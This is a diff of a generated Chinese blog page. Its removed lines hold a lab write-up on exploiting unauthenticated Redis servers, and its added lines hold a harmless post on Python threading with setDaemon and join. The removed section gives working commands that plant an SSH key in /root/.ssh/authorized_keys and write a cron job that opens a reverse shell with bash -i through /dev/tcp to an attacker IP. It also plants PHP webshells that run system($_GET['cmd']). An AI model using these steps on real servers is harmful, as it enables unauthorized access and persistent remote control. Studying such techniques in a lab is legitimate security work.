@@ -15,23 +15,22 @@
 
 
 
-<meta name="description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
+<meta name="description" content="最近因为需要，看了一下python多线程，主要的需求点在是否可以接受用户的中断而退出。
+
+在python中，join, setDaemon是用来对线程做处理的。但是这两个函数实现的功能基本上是相反的。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Redis利用小结">
-<meta property="og:url" content="http://yoursite.com/2017/03/04/redis利用小结/index.html">
+<meta property="og:title" content="python多线程中setDaemon与join的问题">
+<meta property="og:url" content="http://yoursite.com/2017/04/03/python多线程中setDaemon与join的问题/index.html">
 <meta property="og:site_name" content="shin's blog">
-<meta property="og:description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_2.png">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_3.png">
-<meta property="og:updated_time" content="2017-03-04T12:42:59.000Z">
+<meta property="og:description" content="最近因为需要，看了一下python多线程，主要的需求点在是否可以接受用户的中断而退出。
+
+在python中，join, setDaemon是用来对线程做处理的。但是这两个函数实现的功能基本上是相反的。">
+<meta property="og:updated_time" content="2017-04-03T07:06:22.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Redis利用小结">
-<meta name="twitter:description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
-<meta name="twitter:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png">
+<meta name="twitter:title" content="python多线程中setDaemon与join的问题">
+<meta name="twitter:description" content="最近因为需要，看了一下python多线程，主要的需求点在是否可以接受用户的中断而退出。
+
+在python中，join, setDaemon是用来对线程做处理的。但是这两个函数实现的功能基本上是相反的。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Redis利用小结 | shin&#39;s blog</title>
+<title>python多线程中setDaemon与join的问题 | shin&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -224,11 +223,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-redis利用小结" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-python多线程中setDaemon与join的问题" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/04/redis利用小结/" class="article-date">
-      <time datetime="2017-03-04T12:36:02.000Z" itemprop="datePublished">2017-03-04</time>
+      <a href="/2017/04/03/python多线程中setDaemon与join的问题/" class="article-date">
+      <time datetime="2017-04-03T06:47:21.000Z" itemprop="datePublished">2017-04-03</time>
 </a>
 
 
@@ -243,7 +242,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Redis利用小结
+      python多线程中setDaemon与join的问题
     </h1>
   
 
@@ -254,7 +253,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -264,107 +263,27 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="REDIS-远程利用"><a href="#REDIS-远程利用" class="headerlink" title="REDIS 远程利用"></a>REDIS 远程利用</h1><blockquote>
-<p>自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 <code>protected-mode no</code>来模拟。 至于实际环境中可以用SSRF来利用。</p>
+        <blockquote>
+<p>最近因为需要，看了一下python多线程，主要的需求点在是否可以接受用户的中断而退出。</p>
 </blockquote>
+<p>在python中，<code>join</code>, <code>setDaemon</code>是用来对线程做处理的。但是这两个函数实现的功能基本上是相反的。</p>
 <a id="more"></a>
-<h2 id="0x00-REDIS-常用命令"><a href="#0x00-REDIS-常用命令" class="headerlink" title="0x00 REDIS 常用命令"></a>0x00 REDIS 常用命令</h2><p><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="external">redis 命令参考简体中文版</a></p>
-<ol>
-<li><p>操作String。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">set key value  # 设置键值对</div><div class="line">GET key     # 返回键对应的值.</div><div class="line">exists key  # 判断键是否存在</div><div class="line">del key   # 删除键</div><div class="line">strlen key # 返回key的长度</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作Hash</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">hset key field value # 将一个key的字段赋值</div><div class="line">hset person name &quot;shinpachi8&quot;</div><div class="line">hmset key field value field2 value2  # 对一个键多个字段同时赋值</div><div class="line">hgetall key # 返回key中所有字段的值。</div><div class="line">hexsits key field # 查看key中的field字段是否存在。</div><div class="line">hlen key # 返回哈希表 key 中的字段总数</div><div class="line">hdel key field [field] # 删除一个或多个字段</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作列表</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lpush key value [value2] # 将 一个或多个值</div><div class="line">lpop key # 移出列表的第一个值并返回</div><div class="line">lrange key start stop # 返回指定范围内的元素</div><div class="line">llen key # 列表key 的长度</div><div class="line">lset key index value # 用下标来设置值</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作集合</p>
+<p>我们写一个简单的例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestDaemon</span><span class="params">(Thread)</span>:</span></div><div class="line">    <span class="string">"""docstring for TestDaemon"""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></div><div class="line">        Thread.__init__(self)</div><div class="line">        self.arg = arg</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"></div><div class="line">            <span class="keyword">print</span> <span class="string">"Threading number : &#123;&#125;"</span>.format(self.arg)</div><div class="line">            time.sleep(<span class="number">0.01</span>)</div></pre></td></tr></table></figure></p>
+<p>在这个例子中，如果我们用<code>join</code>函数来实现其<code>main</code>函数如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    threads = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        t = TestDaemon(i)</div><div class="line">        threads.append(t)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">        <span class="comment"># thread.setDaemon(True)</span></div><div class="line">        thread.start()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">            <span class="keyword">if</span> thread.is_alive():</div><div class="line">                thread.join()</div><div class="line">        <span class="comment"># while True:</span></div><div class="line">        <span class="comment">#     for thread in threads:</span></div><div class="line">        <span class="comment">#         if thread.is_alive():</span></div><div class="line">        <span class="comment">#             pass</span></div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"User Stop"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Main is Done"</span></div></pre></td></tr></table></figure></p>
+<p>我们执行一下看,发现并不能使用<code>ctrl-c</code>使其中断。因为<code>join()</code>函数会让主线程一直阻塞，直到使用<code>join()</code>函数的线程终止。 我们看一下<a href="https://docs.python.org/2/library/threading.html#threading.Thread.join" target="_blank" rel="external">官方文档</a></p>
 <blockquote>
-<p>是string 的无序集合，集合成员是唯一的。 添加/删除/查找 的时间复杂度都是o(1)</p>
+<p>Wait until the thread terminates. This blocks the calling thread until the thread whose join() method is called terminates – either normally or through an unhandled exception – or until the optional timeout occurs.</p>
 </blockquote>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sadd key value1 [value2] # 向集合添加一个或多个值</div><div class="line">sdiff key1 key2 # 返回不同集合之间的差值</div><div class="line">spop key # 返回key中的一个随机值并删除它</div><div class="line">sunion key1 key2 # 返回并集</div></pre></td></tr></table></figure>
-</li>
-<li><p>redis 备份与恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">save # 保存文件</div><div class="line">bgsave # 在后台保存文件</div></pre></td></tr></table></figure>
-<p>如果在恢复，只需要将备份文件(dump.rdb) 保存在redis安装目录并启动服务即可。</p>
-</li>
-</ol>
-<h2 id="0x01-远程登录查看INFO"><a href="#0x01-远程登录查看INFO" class="headerlink" title="0x01 远程登录查看INFO"></a>0x01 远程登录查看INFO</h2><blockquote>
-<p>在这里可以长个心眼，如果版本在这之上的，还可以远程连接，有可能是蜜罐…</p>
-</blockquote>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png" alt="远程登录查看info"></p>
-<h2 id="0x02-拿SHELL"><a href="#0x02-拿SHELL" class="headerlink" title="0x02 拿SHELL"></a>0x02 拿SHELL</h2><ol>
-<li><p>通过写入 rsa的公钥来远程登录。</p>
-<blockquote>
-<p>其实也可以写入其他用户目录下，但是一般来说REDIS多用ROOT权限登录，直接写入/root/目录下可以省去猜用户的步骤</p>
-</blockquote>
-<ul>
-<li><p>生成rsa公私钥对。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
-</li>
-<li><p>将公钥写入 文件中</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后利用 redis-cli 的 管道技术将值设置进去, 然后再进入redis, 更改其配置文件与数据库名，保存。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$cat foo.txt | redis-cli -h 10.1.1.212 -x set crackredis</div><div class="line">$redis-cli -h 10.1.1.212  # 连接，以下操作在redis-cli 命令行中进行</div><div class="line">$10.1.1.212:6379&gt; CONFIG SET dir /root/.ssh/</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dbfilename &quot;authorized_keys&quot;</div><div class="line">$10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后用私钥连接目标即可。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -i id_rsa root@10.1.1.212</div></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>通过写入 <code>crontab</code> (计划性任务) 来反弹 shell</p>
-<blockquote>
-<p>在测试时用 flush all 将数据删除，在实际中可以不用。或者先保存，再删除，之后再恢复。</p>
-</blockquote>
-<ul>
-<li><p>删除所有数据</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$10.1.1.212:6379&gt; FLUSHALL</div><div class="line">$10.1.1.212:6379&gt;exit</div></pre></td></tr></table></figure>
-</li>
-<li><p>用管道来将计划任务写入redis中, 或者之前不退出，直接写入。 其中 set 1 的意思是将内容的健设置为1，这样保证保存的时候在最前边。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">echo &quot;\n\n */1 * * * * bash -i &gt;&amp; /dev/tcp/10.1.1.100/2333 0&gt;&amp;1 \n\n&quot; | redis-cli -h 10.1.1.212 -x set 1</div><div class="line">redis-cli -h 10.1.1.212</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dir /var/spool/cron</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dbfilename root</div><div class="line">$10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后再本机监控 2333端口</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 2333</div></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ol>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_2.png" alt="监听的端口"></p>
-<ol>
-<li><p>写一个WEBSHELL。</p>
-<blockquote>
-<p>同样，在测试环境中，首先将所有的数据 flushall掉。</p>
-</blockquote>
-<ul>
-<li><p>直接登录</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.1.1.212</div><div class="line">10.1.1.212:6379&gt; CONFIG SET dir /var/www/html/</div><div class="line">10.1.1.212:6379&gt; CONFIG SET dbfilename &quot;test.php&quot;</div><div class="line">10.1.1.212:6379&gt; set a &quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;</div><div class="line">10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>浏览器访问</p>
-</li>
-</ul>
-</li>
-</ol>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_3.png" alt="写webshell"></p>
-<ol>
-<li><p>写一个webshell</p>
-<blockquote>
-<p>这里不将数据 flushall， 这时候需要考虑的是在写入的键包含<code>?&gt;</code> 或者 <code>&lt;?</code> 可以破坏PHP结构的语句。 同时以防数据量过大超时。 可以将文件写成一个写入文件的shell。</p>
-</blockquote>
-<ul>
-<li><p>直接写入文件</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.1.1.212</div><div class="line"></div><div class="line"># 写入内容为:</div><div class="line">&lt;?php</div><div class="line">    set_time_limit(0);</div><div class="line">    $fp=fopen(&quot;webshell.php&quot;,&quot;w&quot;);</div><div class="line">    fwrite($fp,&quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;);</div><div class="line">    exit();</div><div class="line">?&gt;</div><div class="line"></div><div class="line">// 或者用file_put_contents()</div></pre></td></tr></table></figure>
-<p>  但是这个我在的实验环境中没有成功。</p>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="0x03-参考连接"><a href="#0x03-参考连接" class="headerlink" title="0x03 参考连接"></a>0x03 参考连接</h2><ol>
-<li><a href="https://www.secpulse.com/archives/39440.html" target="_blank" rel="external">redis写shell的小技巧</a></li>
-<li><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="external">Redis 未授权访问配合 SSH key 文件利用分析</a></li>
-<li><a href="https://www.secpulse.com/archives/5357.html" target="_blank" rel="external">利用redis写webshell</a></li>
-</ol>
+<p>所以如果我们想在主线程中通过<code>ctrl-c</code>来终止，使用<code>join()</code>是不可行的。</p>
+<p>那么<code>setDaemon()</code>函数呢？ 这个函数一定要在<code>start()</code>函数前使用。它将生成一个守护线程。即如果主线程被Kill掉，那么子线程也被会Kill掉。</p>
+<p>main函数如下时<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    threads = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        t = TestDaemon(i)</div><div class="line">        threads.append(t)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">        thread.setDaemon(<span class="keyword">True</span>)</div><div class="line">        thread.start()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># while True:</span></div><div class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">            <span class="keyword">if</span> thread.is_alive():</div><div class="line">                <span class="keyword">pass</span></div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"User Stop"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Main is Done"</span></div></pre></td></tr></table></figure></p>
+<p>输出为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Threading number : 0</div><div class="line">Threading number : 1</div><div class="line"> Threading number : 2</div><div class="line">Threading number : 3</div><div class="line">Threading number : 4</div><div class="line"> Main is Done</div></pre></td></tr></table></figure>
+<p>可以看出，随着主线程的结束，所有setDaemon的线程也结束，并未被其定义<code>while</code>循环阻塞住。<br>如果我们添加到while中</p>
+<p>main函数如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    threads = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        t = TestDaemon(i)</div><div class="line">        threads.append(t)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">        thread.setDaemon(<span class="keyword">True</span>)</div><div class="line">        thread.start()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</div><div class="line">                <span class="keyword">if</span> thread.is_alive():</div><div class="line">                    <span class="keyword">pass</span></div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"User Stop"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Main is Done"</span></div></pre></td></tr></table></figure></p>
+<p>输出为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> Threading number : 4</div><div class="line">Threading number : 3</div><div class="line"> Threading number : 2</div><div class="line">Threading number : 0</div><div class="line">Threading number : 4</div><div class="line">Threading number : 1</div><div class="line">Threading number : 2</div><div class="line">Threading number : 3</div><div class="line">Threading number : 0</div><div class="line">Threading number : 4</div><div class="line">Threading number : 1</div><div class="line">Threading number : 3</div><div class="line">Threading number : 2</div><div class="line">^CUser Stop</div><div class="line">Main is Done</div><div class="line">----------------------</div></pre></td></tr></table></figure>
+<p>可以看到我们的<code>User Stop</code>已经输出，并且程序也结束了。<br>当然我们还可以对某些进程设置为<code>join</code>或者<code>setDaemon</code></p>
 
       
     </div>
@@ -373,13 +292,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/04/redis利用小结/">Redis利用小结</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/03/python多线程中setDaemon与join的问题/">python多线程中setDaemon与join的问题</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
-        <p><span>发布时间:</span>2017-03-04, 20:36:02</p>
-        <p><span>最后更新:</span>2017-03-04, 20:42:59</p>
+        <p><span>发布时间:</span>2017-04-03, 14:47:21</p>
+        <p><span>最后更新:</span>2017-04-03, 15:06:22</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/04/redis利用小结/" title="Redis利用小结">http://yoursite.com/2017/03/04/redis利用小结/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/03/04/redis利用小结/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/03/python多线程中setDaemon与join的问题/" title="python多线程中setDaemon与join的问题">http://yoursite.com/2017/04/03/python多线程中setDaemon与join的问题/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/03/python多线程中setDaemon与join的问题/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -391,16 +310,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/03/17/njctf2017-writeup-md/">
-                    Njctf2017-Writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/02/22/lfi/">
-                    本地文件包含简单练习
+                <a href="/2017/03/20/bluecms-v1-6-audit/">
+                    Bluecms-v1.6-Audit
                 </a>
             </div>
         
@@ -412,7 +325,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#REDIS-远程利用"><span class="toc-number">1.</span> <span class="toc-text">REDIS 远程利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-REDIS-常用命令"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 REDIS 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-远程登录查看INFO"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 远程登录查看INFO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-拿SHELL"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 拿SHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考连接"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 参考连接</span></a></li></ol></li></ol>
+            
         
     </div>
     <style>
@@ -448,7 +361,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Redis利用小结　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"python多线程中setDaemon与join的问题　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -464,7 +377,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box" ></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2017/03/04/redis利用小结/" data-title="Redis利用小结" data-url="http://yoursite.com/2017/03/04/redis利用小结/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/04/03/python多线程中setDaemon与join的问题/" data-title="python多线程中setDaemon与join的问题" data-url="http://yoursite.com/2017/04/03/python多线程中setDaemon与join的问题/"></div>
     <script>
         var duoshuoQuery = {short_name:"shinpachi8"};
         var loadComment = function(){
@@ -477,7 +390,7 @@
         
             // Add comment count
             $(function(){ 
-                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/03/04/redis利用小结/&callback=?";
+                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/04/03/python多线程中setDaemon与join的问题/&callback=?";
                 $.getJSON(jsonUrl, function(result){
                     $.each(result.response, function(i, field){
                         var value = field.comments;
@@ -524,15 +437,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/17/njctf2017-writeup-md/" title="上一篇: Njctf2017-Writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/02/22/lfi/" title="下一篇: 本地文件包含简单练习">
+            <a href="/2017/03/20/bluecms-v1-6-audit/" title="下一篇: Bluecms-v1.6-Audit">
                 <i class="fa fa-angle-right"></i>
             </a>
         
